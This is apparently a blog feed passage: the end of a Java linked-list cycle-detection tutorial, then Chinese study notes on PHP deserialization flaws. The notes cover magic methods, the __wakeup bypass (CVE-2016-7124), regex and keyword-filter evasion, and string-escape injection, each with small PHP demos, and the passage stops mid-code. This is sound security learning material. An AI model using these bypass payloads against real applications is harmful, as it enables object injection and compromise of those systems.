n为1的时候，公式就化解为 x &#x3D; z，<br>这就意味着，从头结点出发一个指针，从相遇节点 也出发一个指针，这两个指针每次只走一个节点， 那么当这两个指针相遇的时候就是 环形入口的节点。<br>也就是在相遇节点处，定义一个指针index1，在头结点处定一个指针index2。<br>让index1和index2同时移动，每次移动一个节点， 那么他们相遇的地方就是 环形入口的节点。</p><p>那么 n如果大于1是什么情况呢，就是fast指针在环形转n圈之后才遇到 slow指针。<br>其实这种情况和n为1的时候 效果是一样的，一样可以通过这个方法找到 环形的入口节点，只不过，index1 指针在环里 多转了(n-1)圈，然后再遇到index2，相遇点依然是环形的入口节点。</p><p>在推理过程中，大家可能有一个疑问就是：为什么第一次在环中相遇，slow的 步数 是 x+y 而不是 x + 若干环的长度 + y 呢？<br>首先slow进环的时候，fast一定是先进环来了。<br>如果slow进环入口，fast也在环入口，那么把这个环展开成直线，就是如下图的样子：<br><img src="/2024/09/11/algorithm/List/image-3.png"><br>可以看出如果slow 和 fast同时在环入口开始走，一定会在环入口3相遇，slow走了一圈，fast走了两圈。<br>重点来了，slow进环的时候，fast一定是在环的任意一个位置，如图：<br><img src="/2024/09/11/algorithm/List/image-4.png"><br>那么fast指针走到环入口3的时候，已经走了k + n 个节点，slow相应的应该走了(k + n) &#x2F; 2 个节点。<br>因为k是小于n的（图中可以看出），所以(k + n) &#x2F; 2 一定小于n。<br>也就是说slow一定没有走到环入口3，而fast已经到环入口3了。<br>这说明什么呢？<br>在slow开始走的那一环已经和fast相遇了。<br>那有同学又说了，为什么fast不能跳过去呢？ 在刚刚已经说过一次了，fast相对于slow是一次移动一个节点，所以不可能跳过去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            <span class="keyword">if</span>(slow == fast)&#123;</span><br><span class="line">                <span class="type">ListNode</span> <span class="variable">index1</span> <span class="operator">=</span> fast;</span><br><span class="line">                <span class="type">ListNode</span> <span class="variable">index2</span> <span class="operator">=</span> head;</span><br><span class="line">                <span class="keyword">while</span>(index1 != index2)&#123;</span><br><span class="line">                    index1 = index1.next;</span><br><span class="line">                    index2 = index2.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> index1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用哈希表实现 非常直观的思路是：我们遍历链表中的每个节点，并将它记录下来；一旦遇到了此前遍历过的节点，就可以判定链表中存在环。时间空间复杂度都是O(N)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pos</span> <span class="operator">=</span> head;</span><br><span class="line">        Set&lt;ListNode&gt; visited = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;ListNode&gt;();</span><br><span class="line">        <span class="keyword">while</span>(pos != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited.contains(pos))&#123;</span><br><span class="line">                <span class="keyword">return</span> pos;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                visited.add(pos);</span><br><span class="line">            &#125;</span><br><span class="line">            pos = pos.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/09/11/algorithm/List/image-5.png"></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】反序列化漏洞分析笔记 - 第一部分 PHP反序列化分析</title>
      <link href="/2024/09/10/WebSecurity/owasptop/deserialization/"/>
      <url>/2024/09/10/WebSecurity/owasptop/deserialization/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是序列化和反序列化？"><a href="#什么是序列化和反序列化？" class="headerlink" title="什么是序列化和反序列化？"></a>什么是序列化和反序列化？</h1><p>我个人的理解是：序列化是将对象转换为字节流，反序列化是将字节流转换为对象。为什么会有这些概念呢？还是来源于具体的需求，举个例子来说，比如一个公司要开发一个软件，这个软件需要保存用户的信息，那么这个信息需要持久化存储，那么这个信息怎么存储呢，这些信息可能是个在程序运行时可能是个对象，经过序列化之后，就可以存储到文件中，那么反序列化就是将存储在文件中的对象，恢复成对象，这样就可以解决对象的持久化存储的问题。</p><h2 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h2><p>不管是什么语言的序列化，从概念需求出发，就可以决定出场景：数据存储、网络传输、通过特定协议读取。</p><h2 id="为什么反序列化会出现漏洞？"><a href="#为什么反序列化会出现漏洞？" class="headerlink" title="为什么反序列化会出现漏洞？"></a>为什么反序列化会出现漏洞？</h2><p>从根本原因来看，我个人感觉还是来自输入数据校验不完整，反序列化漏洞的存在应当归咎于开发者（有时候在想一些漏洞成因时，我总是想要确定下应当是谁负责任……），开发者开发应用时应当假设所有用户都是不可信的，对于所有用可能接触到的输入点都需要格外注意。就反序列化来说，一旦输入数据没有经过校验，那么反序列化的对象就可能会被恶意用户定制化，进而执行恶意代码。</p><h2 id="漏洞利用的关键"><a href="#漏洞利用的关键" class="headerlink" title="漏洞利用的关键"></a>漏洞利用的关键</h2><p>黑盒：判断出存在有序列化的数据，序列化的接口，观察恢复元数据，利用原生类构造调用链，验证是否存在<br>白盒：定位关键函数，观察序列化输入是否可控</p><h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p>在PHP中，序列化和反序列化是将对象转换为可以存储或传输的字符串表示形式的过程，以及将这种字符串表示形式恢复为对象的过程。魔术方法（magic methods）是PHP中一些以双下划线开始的方法，它们在某些操作发生时自动被调用，例如对象的创建、销毁、调用不存在的方法等。序列化和反序列化的函数是使用<code>unserialize()</code>和<code>serialize()</code>函数，其实感觉没什么讨论的，重点先讨论下魔术方法。</p><h2 id="PHP中的魔术方法"><a href="#PHP中的魔术方法" class="headerlink" title="PHP中的魔术方法"></a>PHP中的魔术方法</h2><p>以下内容参考自：<a href="https://segmentfault.com/a/1190000007250604">PHP之十六个魔术方法详解</a></p><ul><li>__construct()，类的构造函数</li><li>__destruct()，类的析构函数</li><li>__call()，在对象中调用一个不可访问方法时调用</li><li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li><li>__get()，获得一个类的成员变量时调用</li><li>__set()，设置一个类的成员变量时调用</li><li>__isset()，当对不可访问属性调用isset()或empty()时调用</li><li>__unset()，当对不可访问属性调用unset()时被调用。</li><li>__sleep()，执行serialize()时，先会调用这个函数</li><li>__wakeup()，执行unserialize()时，先会调用这个函数</li><li>__toString()，类被当成字符串时的回应方法</li><li>__invoke()，调用函数的方式调用一个对象时的回应方法</li><li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li><li>__clone()，当对象复制完成时调用</li><li>__autoload()，尝试加载未定义的类</li><li>__debugInfo()，打印所需调试信息</li></ul><p>其中，__toString()用的比较多，它的触发场景可以总结为下面这些：</p><ul><li>echo($obj)&#x2F;print($obj)打印时会触发 </li><li>反序列化对象与字符串连接时 </li><li>反序列化对象参与格式化字符串时 </li><li>反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型） </li><li>反序列化对象参与格式化SQL语句，绑定参数时 </li><li>反序列化对象在经过php字符串处理函数，如strlen()、strops()、strcmp()、addslashes()等 </li><li>在in_array()方法中，第一个参数时反序列化对象，第二个参数的数组中有__toString()返回的字符串的时候__toString()会被调用 </li><li>反序列化的对象作为class_exists()的参数的时候</li></ul><p>从序列化到反序列化这几个函数的执行过程是：<br><code>__construct()</code> -&gt;<code>__sleep()</code> -&gt; <code>__wakeup()</code> -&gt; <code>__toString()</code> -&gt; <code>__destruct()</code><br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image.png" alt="Alt text"></p><p>图中显示的是很经典的图，展示了对象序列化后的内容，其中：</p><ul><li>a - array 数组型</li><li>b - boolean 布尔型</li><li>d - double 浮点型</li><li>i - integer 整数型</li><li>o - common object 共同对象</li><li>r - objec reference 对象引用</li><li>s - non-escaped binary string 非转义的二进制字符串</li><li>S - escaped binary string 转义的二进制字符串</li><li>C - custom object 自定义对象</li><li>O - class 对象</li><li>N - null 空</li><li>R - pointer reference 指针引用</li><li>U - unicode string Unicode 编码的字符串</li></ul><p>PHP序列化需注意以下几点：</p><ol><li>只序列化属性：PHP的序列化机制默认只序列化对象的公共（public）和受保护（protected）属性。私有（private）属性不会被序列化，除非在类的 __sleep() 魔术方法中明确指定。</li><li>类定义必须可用：反序列化对象时，必须确保定义该对象的类在当前作用域中可用。如果类定义不存在，反序列化将失败，并且可能产生警告或错误。</li><li>控制属性：攻击者如果能够控制序列化数据中的属性值，可能会尝试利用这些属性来触发类的其他方法或执行不安全的操作。</li></ol><h2 id="PHP反序列化绕过技巧"><a href="#PHP反序列化绕过技巧" class="headerlink" title="PHP反序列化绕过技巧"></a>PHP反序列化绕过技巧</h2><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">源自这里</a></p><h3 id="php7-1-反序列化对类属性不敏感"><a href="#php7-1-反序列化对类属性不敏感" class="headerlink" title="php7.1+反序列化对类属性不敏感"></a>php7.1+反序列化对类属性不敏感</h3><p>在序列化的数据中，如果类的属性是protect，则结果会在变量名前加上<code>\x00*\x00</code>(所以在fuzzing时需要注意用urlencode处理，不然直接输出显示会丢掉这些字符)<br>但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有<code>\x00*\x00</code>，也会正常输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="绕过-wakeup-CVE-2016-7124"><a href="#绕过-wakeup-CVE-2016-7124" class="headerlink" title="绕过__wakeup(CVE-2016-7124)"></a>绕过__wakeup(CVE-2016-7124)</h3><p>版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10<br>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果执行<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>, 输出结果为 666<br>而把对象属性个数的值增大执行 <code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>，则会输出abc</p><h3 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="绕过部分正则"></a>绕过部分正则</h3><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头</p><ul><li>利用加号绕过（注意在url里传参时+要编码为%2B）</li><li>serialize(array(a));为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="利用引用"><a href="#利用引用" class="headerlink" title="利用引用"></a>利用引用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b= &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;a===<span class="variable language_">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面例子中将$a赋值给$b，然后反序列化$a，由于$b是引用关系，所以反序列化后$b也会被赋值为abc，所以反序列化后输出666</p><h3 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;%00*%00a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\00*\00\61&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成<span class="number">16</span>进制解析。</span><br></pre></td></tr></table></figure><p>博主写了个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;你绕不过！！&quot;</span>.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 未作处理前</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// 做处理后 \75是u的16进制</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="PHP反序列化字符逃逸"><a href="#PHP反序列化字符逃逸" class="headerlink" title="PHP反序列化字符逃逸"></a>PHP反序列化字符逃逸</h3><p>情况一：过滤后字符串变多<br>下面的代码是把反序列化后的一个x替换成为两个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;xx&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="string">&quot;I am 11&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时，age=<span class="subst">$new</span>[1]&quot;</span>;</span><br></pre></td></tr></table></figure><p>正常情况,传入<code>name=mao</code><br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-1.png"><br>如果此时多传入一个x的话会怎样，毫无疑问反序列化失败，由于溢出(s本来是4结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸<br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-2.png"><br>接下来我们传入：<code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>，<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>，这一部分共20个字符，由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符，造成溢出，而输出了<code>woaini</code>。<br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image-3.png"></p><p>情况二：过滤后字符串变少<br>这次是把两个x替换为1个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;xx&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span 